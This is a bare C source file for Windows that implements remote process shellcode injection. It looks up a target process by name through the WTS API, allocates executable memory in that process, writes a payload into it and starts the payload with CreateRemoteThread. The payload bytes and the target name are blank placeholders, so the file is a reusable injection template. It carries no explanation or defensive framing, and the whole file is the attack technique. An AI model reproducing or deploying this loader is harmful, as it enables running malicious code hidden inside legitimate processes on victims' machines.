#include <Windows.h>
#include <WtsApi32.h>
#include <stdio.h>
#include <winbase.h>
#pragma comment(lib, "wtsapi32")

unsigned char pload[];  //Payload here
unsigned int paylen = sizeof(pload);

int main() {

    DWORD level = 0;
    PWTS_PROCESS_INFO processinfo = NULL;
    DWORD procCount = 0;
    DWORD procId = 0; //PID

    HANDLE hOpProc = NULL;
    LPVOID virtAllmem = NULL;
    HANDLE crtRmtTrd = NULL;

    BOOL reslt = WTSEnumerateProcessesEx(WTS_CURRENT_SERVER_HANDLE, &level, WTS_ANY_SESSION, (LPTSTR*)&processinfo, &procCount);

    wchar_t findProc[]; //Target Process Name

    for (DWORD i = 1; i <= procCount; i++) {
        wchar_t* procName = processinfo->pProcessName;
        if (wcscmp(procName, findProc) == 0) {
            procId = processinfo->ProcessId;//Locate PID here
            break;
        }
        else {
            processinfo++;
        }
    }
    
    hOpProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, procId);

    virtAllmem = VirtualAllocEx( hOpProc, NULL, paylen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hOpProc, virtAllmem, pload, paylen, NULL);

    crtRmtTrd = CreateRemoteThread(hOpProc, NULL, 0, (LPTHREAD_START_ROUTINE)virtAllmem, NULL, 0, NULL);
    WaitForSingleObject(crtRmtTrd, 1000);

    CloseHandle(crtRmtTrd);
    CloseHandle(hOpProc);

    PWTS_PROCESS_INFO forMemClear = processinfo;
    WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, forMemClear, procCount);
    processinfo = NULL;

	return 0;
}

